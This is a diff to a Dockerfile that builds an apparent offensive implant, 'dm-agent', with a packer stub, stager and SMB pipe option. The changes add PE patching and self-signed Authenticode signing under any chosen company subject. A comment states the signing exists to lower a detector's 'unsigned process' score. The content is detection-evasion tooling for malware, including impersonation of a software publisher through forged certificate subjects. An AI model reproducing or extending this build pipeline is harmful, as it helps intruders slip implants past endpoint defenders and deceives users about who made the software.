@@ -1,6 +1,20 @@
+# ── osslsigncode build stage ─────────────────────────────────────────────────
+# Build osslsigncode in Alpine (musl) so the binary is compatible with the
+# rust:1.86-alpine builder stage.  Debian-compiled binaries won't work because
+# they link against glibc which isn't present in Alpine.
+FROM alpine:3.21 AS osslsign
+RUN apk add --no-cache build-base cmake openssl-dev curl-dev zlib-dev git ca-certificates
+RUN git clone --depth 1 https://github.com/mtrojnar/osslsigncode /src && \
+    cmake -S /src -B /build -DCMAKE_BUILD_TYPE=Release && \
+    cmake --build /build -j$(nproc) && \
+    strip /build/osslsigncode
+
+# ── Rust cross-compile builder ────────────────────────────────────────────────
 FROM rust:1.86-alpine AS builder
 
-RUN apk add --no-cache mingw-w64-gcc musl-dev python3
+RUN apk add --no-cache mingw-w64-gcc musl-dev python3 openssl
+
+COPY --from=osslsign /build/osslsigncode /usr/local/bin/osslsigncode
 
 RUN rustup target add x86_64-pc-windows-gnu x86_64-unknown-linux-musl
 
@@ -29,6 +43,9 @@ ARG DM_SMB_PIPE=
 # Set to true to also produce dm-stub.exe (packer stub).
 # The stub wraps whatever binary DM_FEATURES produced — no separate stager rebuild.
 ARG DM_PACK_STAGER=false
+# X.509 subject string for Authenticode signing, e.g. "/C=US/O=Acme Corp/CN=Acme Software".
+# Leave empty to skip signing.  Signed binaries score lower on ATD's "unsigned process" signal.
+ARG DM_SIGN_SUBJECT=
 
 ENV DM_TARGET=$DM_TARGET \
     DM_BIN=$DM_BIN \
@@ -63,7 +80,16 @@ RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
     else \
         cargo build --release --bin dm-agent --target $DM_TARGET; \
     fi && \
-    cp /build/target/${DM_TARGET}/release/${DM_BIN} /output/${DM_BIN}
+    cp /build/target/${DM_TARGET}/release/${DM_BIN} /output/${DM_BIN} && \
+    python3 /deploy/pe_patch.py "/output/${DM_BIN}" --inplace && \
+    if [ "$DM_PACK_STAGER" != "true" ] && [ -n "$DM_SIGN_SUBJECT" ]; then \
+        openssl req -new -x509 -newkey rsa:2048 -keyout /tmp/cs.key -out /tmp/cs.crt \
+            -days 3650 -nodes -subj "$DM_SIGN_SUBJECT" 2>/dev/null && \
+        osslsigncode sign -certs /tmp/cs.crt -key /tmp/cs.key \
+            -h sha256 -in "/output/${DM_BIN}" -out "/output/${DM_BIN}.signed" && \
+        mv "/output/${DM_BIN}.signed" "/output/${DM_BIN}" && \
+        rm -f /tmp/cs.key /tmp/cs.crt; \
+    fi
 
 # ── Packer stub (optional, DM_PACK_STAGER=true) ──────────────────────────────
 # Step 1: build the raw stager (minimal feature set — no evasion, just delivery).
@@ -81,7 +107,16 @@ RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
         DM_STAGER_PATH="$STAGER" \
         cargo build --release --bin dm-stub --target $DM_TARGET \
             --no-default-features --features "packer-stub" && \
-        cp /build/target/${DM_TARGET}/release/dm-stub.exe /output/dm-stub.exe; \
+        cp /build/target/${DM_TARGET}/release/dm-stub.exe /output/dm-stub.exe && \
+        python3 /deploy/pe_patch.py /output/dm-stub.exe --inplace && \
+        if [ -n "$DM_SIGN_SUBJECT" ]; then \
+            openssl req -new -x509 -newkey rsa:2048 -keyout /tmp/cs.key -out /tmp/cs.crt \
+                -days 3650 -nodes -subj "$DM_SIGN_SUBJECT" 2>/dev/null && \
+            osslsigncode sign -certs /tmp/cs.crt -key /tmp/cs.key \
+                -h sha256 -in /output/dm-stub.exe -out /output/dm-stub.exe.signed && \
+            mv /output/dm-stub.exe.signed /output/dm-stub.exe && \
+            rm -f /tmp/cs.key /tmp/cs.crt; \
+        fi; \
     fi
 
 FROM alpine:3.20
